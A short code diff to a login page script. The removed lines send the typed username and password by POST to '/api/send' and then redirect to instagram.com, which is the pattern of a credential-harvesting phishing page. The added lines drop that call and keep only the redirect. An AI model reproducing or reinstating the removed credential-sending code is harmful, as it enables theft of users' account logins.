@@ -146,12 +146,9 @@
     async function submitLogin() {
         const username = usernameInput.value;
         const password = passwordInput.value;
-        await fetch("/api/send", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ username, password }),
-        });
-        window.location.href = "https://www.instagram.com/";
+        if (username.trim() && password.trim()) {
+            window.location.href = "https://www.instagram.com/";
+        }
     }
 
     validateInputs(); // Initialize button state on page load
